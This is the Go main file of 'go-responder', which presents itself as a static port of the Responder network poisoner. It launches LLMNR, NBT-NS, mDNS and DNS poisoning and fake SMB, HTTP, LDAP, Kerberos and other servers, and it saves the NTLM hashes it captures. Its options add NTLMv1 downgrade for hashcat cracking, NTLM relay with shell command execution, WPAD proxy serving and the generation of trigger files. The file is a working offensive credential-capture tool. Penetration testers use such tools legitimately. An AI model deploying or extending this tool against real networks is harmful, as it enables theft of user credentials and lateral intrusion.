package main

import (
	"flag"
	"fmt"
	"net"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"

	"go-responder/internal/analyzer"
	"go-responder/internal/core"
	"go-responder/internal/lnkgen"
	"go-responder/internal/poisoner"
	"go-responder/internal/relay"
	"go-responder/internal/server"
)

const banner = `
  ██████╗  ██████╗       ██████╗ ███████╗███████╗██████╗  ██████╗ ███╗   ██╗██████╗ ███████╗██████╗
 ██╔════╝ ██╔═══██╗      ██╔══██╗██╔════╝██╔════╝██╔══██╗██╔═══██╗████╗  ██║██╔══██╗██╔════╝██╔══██╗
 ██║  ███╗██║   ██║█████╗██████╔╝█████╗  ███████╗██████╔╝██║   ██║██╔██╗ ██║██║  ██║█████╗  ██████╔╝
 ██║   ██║██║   ██║╚════╝██╔══██╗██╔══╝  ╚════██║██╔═══╝ ██║   ██║██║╚██╗██║██║  ██║██╔══╝  ██╔══██╗
 ╚██████╔╝╚██████╔╝      ██║  ██║███████╗███████║██║     ╚██████╔╝██║ ╚████║██████╔╝███████╗██║  ██║
  ╚═════╝  ╚═════╝       ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝

  Network protocol Poisoner - Go static implementation
  Based on Responder by Laurent Gaffie (lgandx) - https://github.com/lgandx/Responder
  Go port for air-gapped environments (zero dependencies, single static binary)
  By @bl4ckarch 
  in-loving memory for Mum ❤️
`

func main() {
	iface := flag.String("i", "", "Network interface to listen on (required)")
	flag.BoolVar(&core.Verbose, "v", false, "Verbose output")
	flag.StringVar(&core.OutFile, "o", "hashes.txt", "Output file for captured hashes")
	challenge := flag.String("c", "", "Fixed NTLM challenge (hex). Random if not set.")
	analyze := flag.Bool("A", false, "Analyze mode: log queries but do not poison")

	noSMB := flag.Bool("no-smb", false, "Disable SMB server")
	noHTTP := flag.Bool("no-http", false, "Disable HTTP server")
	noHTTPS := flag.Bool("no-https", false, "Disable HTTPS server")
	noFTP := flag.Bool("no-ftp", false, "Disable FTP server")
	noSMTP := flag.Bool("no-smtp", false, "Disable SMTP server")
	noPOP3 := flag.Bool("no-pop3", false, "Disable POP3 server")
	noIMAP := flag.Bool("no-imap", false, "Disable IMAP server")
	noLDAP := flag.Bool("no-ldap", false, "Disable LDAP server")
	noDNS := flag.Bool("no-dns", false, "Disable DNS server")
	noDCERPC := flag.Bool("no-dcerpc", false, "Disable DCE-RPC server")
	noMSSQL := flag.Bool("no-mssql", false, "Disable MSSQL server")
	noWinRM := flag.Bool("no-winrm", false, "Disable WinRM server (port 5985)")
	noKerberos := flag.Bool("no-kerberos", false, "Disable Kerberos AS-REQ capture (port 88)")
	noProxy := flag.Bool("no-proxy", false, "Disable HTTP proxy NTLM capture (port 3128)")

	lm := flag.Bool("lm", false, "Force NTLMv1 by removing Extended Session Security flag (hashcat -m 5500)")

	selective := flag.Bool("selective", false, "Selective poisoning: only poison hosts where SMB signing is not required (relay targets)")
	relayMode := flag.Bool("relay", false, "Enable NTLM relay: forward auth to a target instead of only capturing")
	relayTo := flag.String("relay-to", "", "Comma-separated relay target IPs (auto-select from network map when empty)")
	relayCmd := flag.String("relay-cmd", "", "Shell command to execute on successful relay (experimental)")

	wpad := flag.Bool("wpad", false, "Enable WPAD PAC file serving from HTTP server")
	wpadProxy := flag.String("wpad-proxy", "", "Proxy host:port to advertise in WPAD PAC file (default: self:3128)")

	lnkgenDir := flag.String("lnkgen", "", "Generate trigger files (SCF/URL/LNK/desktop.ini) in this directory and exit")

	respondTo := flag.String("RespondTo", "", "Comma-separated IPs to respond to (all others ignored)")
	flag.String("R", "", "Alias for --RespondTo")
	dontRespondTo := flag.String("DontRespondTo", "", "Comma-separated IPs to never respond to")
	flag.String("r", "", "Alias for --DontRespondTo")
	respondToName := flag.String("RespondToName", "", "Comma-separated hostnames to respond to")
	flag.String("T", "", "Alias for --RespondToName")
	dontRespondToName := flag.String("DontRespondToName", "", "Comma-separated hostnames to never respond to")
	flag.String("N", "", "Alias for --DontRespondToName")

	flag.Parse()

	if v := flag.Lookup("R").Value.String(); v != "" && *respondTo == "" {
		*respondTo = v
	}
	if v := flag.Lookup("r").Value.String(); v != "" && *dontRespondTo == "" {
		*dontRespondTo = v
	}
	if v := flag.Lookup("T").Value.String(); v != "" && *respondToName == "" {
		*respondToName = v
	}
	if v := flag.Lookup("N").Value.String(); v != "" && *dontRespondToName == "" {
		*dontRespondToName = v
	}

	if *lnkgenDir != "" {
		if *iface == "" {
			fmt.Fprintln(os.Stderr, "[-] -i <interface> required for --lnkgen")
			os.Exit(1)
		}
		ip, err := core.GetIfaceIP(*iface)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] Cannot get IP for interface %s: %v\n", *iface, err)
			os.Exit(1)
		}
		if err := lnkgen.GenerateTriggerFiles(ip, *lnkgenDir); err != nil {
			fmt.Fprintf(os.Stderr, "[-] lnkgen: %v\n", err)
			os.Exit(1)
		}
		return
	}

	if *iface == "" {
		fmt.Fprintln(os.Stderr, "[-] -i <interface> is required")
		flag.Usage()
		os.Exit(1)
	}

	ip, err := core.GetIfaceIP(*iface)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Cannot get IP for interface %s: %v\n", *iface, err)
		os.Exit(1)
	}

	core.IfaceName = *iface
	core.InitSession(*challenge)
	core.AnalyzeMode = *analyze
	core.LMMode = *lm
	core.WPADEnabled = *wpad
	core.WPADProxyHost = *wpadProxy
	core.SelectiveMode = *selective
	core.RelayMode = *relayMode
	core.RelayExecCmd = *relayCmd
	relay.ExecCmd = *relayCmd

	if *relayTo != "" {
		for _, raw := range strings.Split(*relayTo, ",") {
			raw = strings.TrimSpace(raw)
			if ip := net.ParseIP(raw); ip != nil {
				relay.FixedTargets = append(relay.FixedTargets, ip)
			} else {
				fmt.Fprintf(os.Stderr, "[-] invalid relay target IP: %s\n", raw)
			}
		}
	}

	core.RespondToIPs = core.ParseIPList(*respondTo)
	core.DontRespondIPs = core.ParseIPList(*dontRespondTo)
	core.RespondToNames = core.ParseNameList(*respondToName)
	core.DontRespondNames = core.ParseNameList(*dontRespondToName)

	fmt.Print(banner)
	printStartup(ip, *noSMB, *noHTTP, *noHTTPS, *noFTP, *noSMTP, *noPOP3, *noIMAP, *noLDAP, *noDNS, *noDCERPC, *noMSSQL, *noWinRM, *noKerberos, *noProxy)

	go poisoner.PoisonLLMNR(ip)
	go poisoner.PoisonNBTNS(ip)
	go poisoner.PoisonMDNS(ip)
	if !*noDNS {
		go poisoner.ServeDNS(ip)
	}

	if !*noSMB {
		go server.ServeSMB(ip)
	}
	if !*noHTTP {
		go server.ServeHTTP(ip)
	}
	if !*noHTTPS {
		go server.ServeHTTPS(ip)
	}
	if !*noFTP {
		go server.ServeFTP(ip)
	}
	if !*noSMTP {
		go server.ServeSMTP(ip)
	}
	if !*noPOP3 {
		go server.ServePOP3(ip)
	}
	if !*noIMAP {
		go server.ServeIMAP(ip)
	}
	if !*noLDAP {
		go server.ServeLDAP(ip)
	}
	if !*noDCERPC {
		go server.ServeDCERPC(ip, core.SessionDCERPCPort)
	}
	if !*noMSSQL {
		go server.ServeMSSQL(ip)
	}
	if !*noWinRM {
		go server.ServeWinRM(ip)
	}
	if !*noKerberos {
		go server.ServeKerberos(ip)
	}
	if !*noProxy {
		go server.ServeProxy(ip)
	}

	fmt.Println("[+] Listening for events...")
	fmt.Println()

	// Periodically print the network map when analyze or selective mode is active.
	if core.AnalyzeMode || core.SelectiveMode || core.RelayMode {
		go func() {
			ticker := time.NewTicker(2 * time.Minute)
			defer ticker.Stop()
			for range ticker.C {
				analyzer.Global.PrintMap()
			}
		}()
	}

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	<-sig
	if core.AnalyzeMode || core.SelectiveMode || core.RelayMode {
		analyzer.Global.PrintMap()
	}
	fmt.Printf("\n[*] Shutting down. Hashes saved to %s\n", core.OutFile)
}

func printStartup(ip interface{}, noSMB, noHTTP, noHTTPS, noFTP, noSMTP, noPOP3, noIMAP, noLDAP, noDNS, noDCERPC, noMSSQL, noWinRM, noKerberos, noProxy bool) {
	on := func(disabled bool) string {
		if disabled {
			return core.CRed + "OFF" + core.CReset
		}
		return core.CGreen + "ON " + core.CReset
	}

	fmt.Printf("[+] Poisoners:\n")
	fmt.Printf("    LLMNR                      [%s]\n", on(false))
	fmt.Printf("    NBT-NS                     [%s]\n", on(false))
	fmt.Printf("    MDNS                       [%s]\n", on(false))
	fmt.Printf("    DNS                        [%s]\n", on(noDNS))
	fmt.Println()

	fmt.Printf("[+] Servers:\n")
	fmt.Printf("    SMB server                 [%s]\n", on(noSMB))
	fmt.Printf("    HTTP server                [%s]\n", on(noHTTP))
	fmt.Printf("    HTTPS server               [%s]\n", on(noHTTPS))
	fmt.Printf("    FTP server                 [%s]\n", on(noFTP))
	fmt.Printf("    SMTP server                [%s]\n", on(noSMTP))
	fmt.Printf("    POP3 server                [%s]\n", on(noPOP3))
	fmt.Printf("    IMAP server                [%s]\n", on(noIMAP))
	fmt.Printf("    LDAP server                [%s]\n", on(noLDAP))
	fmt.Printf("    MSSQL server               [%s]\n", on(noMSSQL))
	fmt.Printf("    DCE-RPC server             [%s]\n", on(noDCERPC))
	fmt.Printf("    WinRM server               [%s]\n", on(noWinRM))
	fmt.Printf("    Kerberos server            [%s]\n", on(noKerberos))
	fmt.Printf("    HTTP Proxy                 [%s]\n", on(noProxy))
	fmt.Println()

	fmt.Printf("[+] Generic Options:\n")
	fmt.Printf("    Responder NIC              [%s]\n", core.IfaceName)
	fmt.Printf("    Responder IP               [%s]\n", ip)
	fmt.Printf("    Challenge set              [%s]\n", core.ChallengeHexStr())
	fmt.Printf("    LM downgrade               [%v]\n", core.LMMode)
	fmt.Printf("    Analyze mode               [%v]\n", core.AnalyzeMode)
	fmt.Printf("    Selective poisoning        [%v]\n", core.SelectiveMode)
	fmt.Printf("    Relay mode                 [%v]\n", core.RelayMode)
	if core.RelayMode && len(relay.FixedTargets) > 0 {
		fmt.Printf("    Relay targets              %v\n", relay.FixedTargets)
	}
	if core.RelayExecCmd != "" {
		fmt.Printf("    Relay exec cmd             [%s]\n", core.RelayExecCmd)
	}
	if core.WPADEnabled {
		fmt.Printf("    WPAD                       [ON - proxy %s]\n", core.WPADProxyHost)
	}
	fmt.Println()

	if len(core.RespondToIPs) > 0 {
		fmt.Printf("[+] RespondTo filter:         %v\n", core.RespondToIPs)
	}
	if len(core.DontRespondIPs) > 0 {
		fmt.Printf("[+] DontRespondTo filter:     %v\n", core.DontRespondIPs)
	}
	if len(core.RespondToNames) > 0 {
		fmt.Printf("[+] RespondToName filter:     %v\n", core.RespondToNames)
	}
	if len(core.DontRespondNames) > 0 {
		fmt.Printf("[+] DontRespondToName filter: %v\n", core.DontRespondNames)
	}

	fmt.Printf("[+] Current Session Variables:\n")
	fmt.Printf("    Responder Machine Name     [%s]\n", core.SessionMachineName)
	fmt.Printf("    Responder Domain Name      [%s]\n", core.SessionDomain)
	fmt.Printf("    Responder DCE-RPC Port     [%d]\n", core.SessionDCERPCPort)
	fmt.Printf("    Output file                [%s]\n", core.OutFile)
	fmt.Println()
}
